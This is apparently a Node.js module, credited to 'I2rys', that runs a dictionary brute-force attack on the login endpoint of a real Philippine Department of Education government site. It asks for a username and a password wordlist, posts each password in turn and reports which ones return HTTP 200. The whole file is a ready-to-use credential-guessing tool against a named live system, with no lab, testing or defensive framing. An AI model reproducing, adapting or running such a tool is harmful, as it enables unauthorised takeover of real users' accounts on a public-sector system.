//Dependencies
const Request = require("request")

//Main
function info(){
    return {
        "name": "Lis Deped Gov login bruteforcer",
        "author": "I2rys"
    }
}

function bruteforce(Fs, Chalk, Readline){
    Readline.question(`${Chalk.blueBright("username: ")}`, username=>{
        Readline.question(`${Chalk.blueBright("dictionary: ")}`, dictionary=>{
            var dictionary_data = Fs.readFileSync(dictionary, "utf8")
            dictionary_data = dictionary_data.replace(/\r/g, "").split("\n")

            var dictionary_index = 0

        
            Check()
            function Check(){
                if(dictionary_index == dictionary_data.length){
                    console.log(`${info().name} is finished bruteforcing.`)
                    process.exit()
                }
            
                Request.post("https://lis.deped.gov.ph/uis/login_check", {
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded"
                    },
                    body: `_username=${username}&_password=${dictionary_data[dictionary_index]}`
                }, function(err, res, body){
                    if(res.statusCode == 200){
                        console.log(`Valid password ${dictionary_data[dictionary_index]}`)
                    }else{
                        console.log(`Invalid password ${dictionary_data[dictionary_index]}`)
                    }
            
                    dictionary_index += 1
                    Check()
                    return
                })
            }
        })
    })
}

//Exporter
module.exports = {
    info: info,
    bruteforce: bruteforce
}